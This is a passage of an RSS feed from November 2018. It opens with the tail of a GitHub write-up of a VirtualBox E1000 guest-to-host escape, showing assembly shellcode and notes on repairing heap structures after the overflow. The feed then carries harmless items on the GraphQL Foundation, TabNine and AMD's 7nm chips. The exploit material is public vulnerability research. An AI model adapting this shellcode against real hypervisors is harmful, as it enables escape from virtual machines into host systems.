&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x8&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Fix the linked list of PDMQUEUE to prevent segfaults on VM shutdown&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; Before:   &quot;E1000-Xmit&quot; -&amp;gt; &quot;E1000-Rcv&quot; -&amp;gt; &quot;Mouse_1&quot; -&amp;gt; NULL&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; After:    &quot;E1000-Xmit&quot; -&amp;gt; NULL&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Zero out the entire PDMQUEUE &quot;Mouse_1&quot; pointed by &quot;E1000-Rcv&quot;&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; This was unnecessary on my testing machines but to be sure...&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0xA0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;rep&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;stosb&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; NULL out a pointer to PDMQUEUE &quot;E1000-Rcv&quot; stored in &quot;E1000-Xmit&quot;&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; because the first 8 bytes of &quot;E1000-Rcv&quot; (a pointer to &quot;Mouse_1&quot;) &lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; will be corrupted in MMHyperFree&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; qword &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x0&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Now the last PDMQUEUE is &quot;E1000-Xmit&quot; which will not be corrupted&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When e1kHandleRxPacket is called a callstack is:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#0 e1kHandleRxPacket
#1 e1kTransmitFrame
#2 e1kXmitDesc
#3 e1kXmitPacket
#4 e1kXmitPending
#5 e1kR3NetworkDown_XmitPending
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We'll jump right to e1kR3NetworkDown_XmitPending which does nothing more and returns to a hypervisor function.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;DECLCALLBACK&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;) e1kR3NetworkDown_XmitPending(PPDMINETWORKDOWN pInterface)
{
    PE1KSTATE pThis = &lt;span class=&quot;pl-c1&quot;&gt;RT_FROM_MEMBER&lt;/span&gt;(pInterface, E1KSTATE, INetworkDown);
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt; Resume suspended transmission &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
    STATUS &amp;amp;= ~STATUS_TXOFF;
    &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitPending&lt;/span&gt;(pThis, &lt;span class=&quot;pl-c1&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;fOnWorkerThread&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The shellcode adds 0x48 to RBP to make it as it should be in e1kR3NetworkDown_XmitPending. Next, the registers RBX, R12, R13, R14, R15 are taken from stack because it's required by System V ABI to preserve it in a callee function. If they aren't the hypervisor will crash because of invalid pointers in them.&lt;/p&gt;
&lt;p&gt;It could be enough because the virtual machine isn't crashes anymore and continues execute. But there will an access violation in PDMR3QueueDestroyDevice function when the VM is shutdown. The reason is that when the heap is overflowed an important structure PDMQUEUE is overwritten. Furthermore, it's overwritten by the last two ROP gadgets i.e. the last 16 bytes. I tried to reduce the ROP chain size and failed, but when I replaced the data manually the hypervisor was still crashing. It meant the obstacle is not as obvious as seemed.&lt;/p&gt;
&lt;p&gt;Data structure being overwritten is a linked list. Data to be overwritten is in the last second list element; a next pointer is to be overwritten. The remedy turned out to be simple:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;; Fix the linked list of PDMQUEUE to prevent segfaults on VM shutdown
; Before:   &quot;E1000-Xmit&quot; -&amp;gt; &quot;E1000-Rcv&quot; -&amp;gt; &quot;Mouse_1&quot; -&amp;gt; NULL
; After:    &quot;E1000-Xmit&quot; -&amp;gt; NULL
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Getting rid of the last two elements allows the virtual machine to shut down smoothly.&lt;/p&gt;
&lt;h2&gt;Demo&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://vimeo.com/299325088&quot; rel=&quot;nofollow&quot;&gt;https://vimeo.com/299325088&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;
</description>
<pubDate>Tue, 06 Nov 2018 23:36:55 +0000</pubDate>
<dc:creator>kpcyrd</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/44814771?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>MorteNoir1/virtualbox_e1000_0day</og:title>
<og:url>https://github.com/MorteNoir1/virtualbox_e1000_0day</og:url>
<og:description>VirtualBox E1000 Guest-to-Host Escape. Contribute to MorteNoir1/virtualbox_e1000_0day development by creating an account on GitHub.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/MorteNoir1/virtualbox_e1000_0day</dc:identifier>
</item>
<item>
<title>Facebook’s GraphQL gets its own open-source foundation</title>
<link>https://techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</link>
<guid isPermaLink="true" >https://techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</guid>
<description>&lt;p id=&quot;speakable-summary&quot;&gt;GraphQL, the &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/facebook&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;facebook&quot;&gt;Facebook&lt;/a&gt;-incubated data query language, is moving into its own open-source foundation. Like so many other similar open-source foundations, the aptly named &lt;a href=&quot;https://gql.foundation/&quot;&gt;GraphQL Foundation&lt;/a&gt; will be hosted by the &lt;a href=&quot;https://www.linuxfoundation.org/&quot;&gt;Linux Foundation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Facebook announced GraphQL back in 2012 and open sourced it in 2015. Today, it’s being used by companies that range from &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/airbnb&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;airbnb&quot;&gt;Airbnb&lt;/a&gt; to &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/audi&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;audi&quot;&gt;Audi,&lt;/a&gt; GitHub, Netflix, Shopify, Twitter and &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/newyorktimes&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;newyorktimes&quot;&gt;The New York Times&lt;/a&gt;. At Facebook itself, the GraphQL API powers billions of API calls every day. At its core, GraphQL is basically a language for querying databases from client-side applications and a set of specifications for how the API on the backend should present this data to the client. It presents an alternative to REST-based APIs and promises to offer developers more flexibility and the ability to write faster and more secure applications. Virtually every major programming language now supports it through a variety of libraries.&lt;/p&gt;
&lt;p&gt;“GraphQL has redefined how developers work with APIs and client-server interactions. We look forward to working with the GraphQL community to become an independent foundation, draft their governance and continue to foster the growth and adoption of GraphQL,” said Chris Aniszczyk, vice president of Developer Relations at the Linux Foundation.&lt;/p&gt;
&lt;p&gt;As Aniszczyk noted, the new foundation will have an open governance model, similar to that of other Linux Foundation projects. The exact details are still a work in progress, though. The list of founding members is also still in flux, but for now, it includes Airbnb, Apollo, &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/coursera&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;coursera&quot;&gt;Coursera,&lt;/a&gt; Elementl, Facebook, GitHub, Hasura, Prisma, Shopify and Twitter.&lt;/p&gt;
&lt;p&gt;“We are thrilled to welcome the GraphQL Foundation into the Linux Foundation,” said Jim Zemlin, the executive director of the Linux Foundation. “This advancement is important because it allows for long-term support and accelerated growth of this essential and groundbreaking technology that is changing the approach to API design for cloud-connected applications in any language.”&lt;/p&gt;
&lt;p&gt;For now, the founding members expect that the &lt;a href=&quot;https://github.com/facebook/graphql/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/facebook/graphql/&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNGyEg23-UYk7di1GfMZnTusFoqFoA&quot;&gt;GraphQL specification&lt;/a&gt;, &lt;a href=&quot;https://github.com/graphql/graphql-js&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/graphql/graphql-js&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNEooMZa8QV2gZFTrsa7qy8LJf0DlQ&quot;&gt;GraphQL.js&lt;/a&gt; &lt;wbr/&gt;reference implementation, &lt;a href=&quot;https://github.com/facebook/dataloader&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/facebook/dataloader&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNFYvWnBe3e8paWM7OJ_MlgGGi0U2w&quot;&gt;DataLoader&lt;/a&gt; &lt;wbr/&gt;library and &lt;a href=&quot;https://github.com/graphql/graphiql&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/graphql/graphiql&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNE7baEBQtdRIjqjwOMSAVrZ18u6BA&quot;&gt;GraphiQL&lt;/a&gt; developer tool will become the core technical projects of the foundation, but that, too, could still change.&lt;/p&gt;
&lt;p&gt;At this point, the Linux Foundation is essentially a foundation for foundations. It provides support for dozens of projects now, with Linux itself being just one of those. Those other foundations include the likes of the Cloud Native Computing Foundation (the home of &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/kubernetes&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;kubernetes&quot;&gt;Kubernetes),&lt;/a&gt; the Cloud Foundry Foundation, Automotive Grade Linux, the JS Foundation (which is about to &lt;a href=&quot;https://www.linuxfoundation.org/news/2018/10/node-js-foundation-and-js-foundation-announce-intent-to-create-joint-organization-to-support-the-broad-node-js-and-javascript-communities/&quot;&gt;merge&lt;/a&gt; with the Node.js Foundation) and more.&lt;/p&gt;
&lt;p&gt;As more large companies release open-source projects, those projects that become popular often get to the point where having a single company govern the project’s life cycle is neither feasible nor in the best interest of the community. &lt;a href=&quot;https://www.spinnaker.io/&quot;&gt;Spinnaker&lt;/a&gt;, the continuous delivery platform backed by Netflix and Google, recently &lt;a href=&quot;https://techcrunch.com/2018/10/09/spinnaker-is-the-next-big-open-source-project-to-watch/&quot;&gt;reached this point&lt;/a&gt;, for example. Surely, GraphQL is also now at this point, where it’s stable and has wide adoption but could benefit from being separated from the mothership and get its own vendor-neutral foundation.&lt;/p&gt;
</description>
<pubDate>Tue, 06 Nov 2018 21:12:21 +0000</pubDate>
<dc:creator>bodecker</dc:creator>
<og:title>Facebook’s GraphQL gets its own open-source foundation</og:title>
<og:description>GraphQL, the Facebook -incubated data query language, is moving into its own open-source foundation. Like so many other similar open-source foundations, the aptly named GraphQL Foundation will be hosted by the Linux Foundation. Facebook announced GraphQL back in 2012 and open sourced it in 2015. To…</og:description>
<og:image>https://techcrunch.com/wp-content/uploads/2018/11/2018-11-06_0824.png?w=618</og:image>
<og:url>http://social.techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</dc:identifier>
</item>
<item>
<title>Show HN: TabNine, an autocompleter for all languages</title>
<link>https://tabnine.com/</link>
<guid isPermaLink="true" >https://tabnine.com/</guid>
<description>&lt;p&gt;TabNine is the all-language autocompleter. It uses machine learning to provide responsive, reliable, and relevant suggestions.&lt;/p&gt;
&lt;p&gt;Traditional autocompleters suggest one word at a time.&lt;/p&gt;
&lt;p&gt;Why accept this limitation?&lt;/p&gt;

&lt;table readability=&quot;3&quot;&gt;&lt;tr&gt;&lt;th&gt;Feature&lt;/th&gt;
&lt;th&gt;Premium&lt;/th&gt;
&lt;th&gt;Free&lt;/th&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Whole project indexing&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;.gitignore awareness&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Fuzzy matching&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;No configuration necessary&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;~20 millisecond response time&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Context-aware suggestions&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Vim support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Sublime Text support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;VS Code support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Atom support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Up to 200 KB indexed&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Up to 15 MB indexed&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;All versions of TabNine still work with projects larger than the indexing limit. Files will be added and removed from the index to ensure that the indexed files are as relevant as possible to the files you are editing.&lt;/p&gt;
&lt;p&gt;TabNine offers a 30-day money back guarantee (&lt;a href=&quot;https://tabnine.com/contact&quot;&gt;contact info&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://tabnine.com/install&quot;&gt;Install TabNine here.&lt;/a&gt;&lt;/strong&gt; TabNine is easy to install and no configuration is necessary.&lt;/p&gt;
&lt;p&gt;If TabNine does not work as soon as you install it, this is a bug and you &lt;a href=&quot;https://github.com/zxqfl/tabnine-vim/issues&quot;&gt;should&lt;/a&gt; &lt;a href=&quot;https://github.com/zxqfl/tabnine-sublime/issues&quot;&gt;file&lt;/a&gt; &lt;a href=&quot;https://github.com/zxqfl/tabnine-atom/issues&quot;&gt;an&lt;/a&gt; &lt;a href=&quot;https://github.com/zxqfl/tabnine-vscode/issues&quot;&gt;issue&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;How does it work?&lt;/h2&gt;
&lt;p&gt;TabNine builds an index of your project, reading your .gitignore so that only source files are included. It uses this index to provide useful information to a softmax regression model which ranks candidate completions. For example, TabNine knows how often each pair of consecutive symbols appears in your project, so it knows that &lt;code&gt;static void&lt;/code&gt; is more common than &lt;code&gt;void static&lt;/code&gt; (although they are the same to a C++ compiler).&lt;/p&gt;
&lt;p&gt;The candidate completions are then given to a secondary completion engine, which may suggest additional characters for completion, based on similar patterns found elsewhere in your project. This diagram illustrates the role of this completion engine:&lt;/p&gt;
&lt;div class=&quot;diagram&quot;&gt;&lt;img src=&quot;https://tabnine.com/graph1.png&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Another abstraction layer parameterizes the patterns by the identifiers they contain, allowing TabNine to provide suggestions involving words that it has only seen once, such as &lt;code&gt;String&lt;/code&gt; in this example:&lt;/p&gt;
&lt;div class=&quot;gallery-image&quot;&gt;&lt;img src=&quot;https://tabnine.com/gallery8.png&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Here is a diagram illustrating this process:&lt;/p&gt;
&lt;div class=&quot;diagram&quot;&gt;&lt;img src=&quot;https://tabnine.com/graph2.png&quot;/&gt;&lt;/div&gt;
&lt;h2 id=&quot;instructions&quot;&gt;Installation&lt;/h2&gt;

&lt;h2&gt;Buy a license&lt;/h2&gt;
&lt;p&gt;TabNine costs $29. It is currently in beta. When it is released, your software will automatically update to the full released version at no additional charge.&lt;/p&gt;
&lt;p&gt;TabNine will save you at least 1 second per minute. If you value your time above $0.83/hour, it will pay for itself in less than a year. (Assuming 2087 hours in a work year.)&lt;/p&gt;

</description>
<pubDate>Tue, 06 Nov 2018 18:06:19 +0000</pubDate>
<dc:creator>jacob-jackson</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://tabnine.com/</dc:identifier>
</item>
<item>
<title>AMD Announces 7nm Rome CPUs and MI60 GPUs</title>
<link>https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</link>
<guid isPermaLink="true" >https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</guid>
<description>&lt;p&gt;&lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/img-7243-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1MvODA5MjcyL29yaWdpbmFsL0lNR183MjQzLkpQRw==&quot; big-src=&quot;https://img.purch.com/img-7243-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1MvODA5MjcyL29yaWdpbmFsL0lNR183MjQzLkpQRw==&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;We're here at AMD's Next Horizon Event to bring you up to the minute news on the company's 7nm products. This is breaking news, so check back frequently or refresh the page for updates.&lt;/p&gt;
&lt;p&gt;AMD is expected to make major announcements about its new 7nm CPUs and GPUs. Intel continues to struggle with its 10nm manufacturing process, which is delayed until late 2019. If AMD can field 7nm processors early this year, it will mark the first time in the company's history that it has had a process node leadership position over Intel. That should equate to faster, denser, and less power-hungry processors than Intel's 14nm chips.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-090308-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL08vODA5MTk2L29yaWdpbmFsLzIwMTgxMTA2XzA5MDMwOC5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-090308-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL08vODA5MTk2L29yaWdpbmFsLzIwMTgxMTA2XzA5MDMwOC5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;AMD CEO Lisa Su is delivering the opening statements. She recounted the path of the EPYC data center processors to market and discussed many of the key roles those processors are used for, such as workloads in HPC, cloud, hyperscale, and virtualization environments. AMD sees the data center as a $29 billion opportunity by 2021, and GPUs are playing a larger role as the industry shifts to artificial intelligence and machine learning workloads. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-091702-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1AvODA5MTk3L29yaWdpbmFsLzIwMTgxMTA2XzA5MTcwMi5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-091702-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1AvODA5MTk3L29yaWdpbmFsLzIwMTgxMTA2XzA5MTcwMi5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Amazon Web Services, one of the world's largest cloud service providers, announced that, beginning today, it is offering new EPYC-powered cloud instances. The R5a, M5a and T3a instances purportedly will offer a 10% price-to-performance advantage over AWS's other cloud instances.&lt;/p&gt;

&lt;p&gt;Mark Papermaster will cover the new Zen 2 cores and AMD's 7nm process technology. AMD will also reveal more about the 7nm Mi60 Instinct GPU for the data center. AMD will also provide early specifications for AMD's Rome, the first x86 7nm processor for the data center. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-092626-jpg/w/711/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1MvODA5MjAwL29yaWdpbmFsLzIwMTgxMTA2XzA5MjYyNi5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-092626-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1MvODA5MjAwL29yaWdpbmFsLzIwMTgxMTA2XzA5MjYyNi5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD is already sampling its 7nm Rome processors, which mark the debut of the Zen 2 microarchitecture, to customers. The firm also has its Zen 3 processors under development. This third-gen microarchitecture will debut on the 7nm+ process, with the &quot;+&quot; indicating this will be a second generation of the 7nm node (a &quot;tock&quot; equivalent). &lt;/p&gt;

&lt;p&gt;The new processors feature faster, smaller, and lower-power transistors. As with all new nodes, development requires a significant investment from both AMD and TSMC, which will fab the parts. The high up-front costs associated with developing a new node pushed AMD's primary manufacturing partner, Global Foundries, out of the 7nm race earlier this year. AMD remains committed to delivering the new node and using it as a vehicle to deliver the new Zen 2 microarchitecture to market.&lt;/p&gt;
&lt;p&gt;AMD also announced that it is already working on the Zen 4 microarchitecture, but didn't reveal significant details.&lt;/p&gt;

&lt;p&gt;Zen 2 will provide up to 2X the compute power per node, improved execution pipeline, doubled core density, and use half the energy per operation. AMD has doubled floating point performance with the Zen 2 microarchitecture.&lt;/p&gt;

&lt;p&gt;AMD has improved the branch predictor, pre-fetching engine, and doubled the load/store bandwidth. AMD also doubled the vector width to 256-bit. We'll follow up with deeper analysis. This type of technical data isn't well suited for live public disclosure. &lt;/p&gt;

&lt;p&gt;AMD has improved the Infinity Fabric. AMD is now using the second-gen Infinity Fabric to connect a multi-chip design with a 14nm I/O die serving as the linchpin of the design. That central chip ties together the 7nm CPU chiplets, creating a massively scalable architecture. We'll follow up with deeper analysis of this design. Note that the DDR4 controllers are all attached to the central I/O chip. That will result in higher memory latency to all connected controllers, but memory latency will be consistent for all compute chiplets (assuming perfectly linear data delivery across the fabric). That should be a major step forward for AMD to address concerns about performance variability.&lt;/p&gt;

&lt;p&gt;David Wang displayed the world's first 7nm GPU. The die wields 13.28B transistors and measures just 331mm&lt;sup&gt;2&lt;/sup&gt;. The GPU is based on the advanced Vega architecture and is the first PCIe 4.0 GPU on the market. It also is the first to use the Infinity Fabric over the external PCIe bus and the first GPU to have 1TB/s of memory bandwidth. The MI60 offers up to 7.4 TFLOPS of FP64 and 14.7 TFLOPS of FP32.&lt;/p&gt;

&lt;p&gt;AMD also presented performance benchmarks highlighting the generational performance gains relative to 12nm GPUs. It also presented scalability benchmarks to highlight gains due to the increased PCIe 4.0 bandwidth. The company also provided direct comparisons to Nvidia's V100 GPUs. These results are, of course, vendor-provided, so we'll have to dive deeper into the conditions of the benchmarks.  &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-102355-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GLzkvODA5MjUzL29yaWdpbmFsLzIwMTgxMTA2XzEwMjM1NS5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-102355-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GLzkvODA5MjUzL29yaWdpbmFsLzIwMTgxMTA2XzEwMjM1NS5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD presented its new GPU roadmap. Shipping MI60 this quarter. &quot;MI-Next&quot; is in development, but with no firm date given for delivery.&lt;/p&gt;

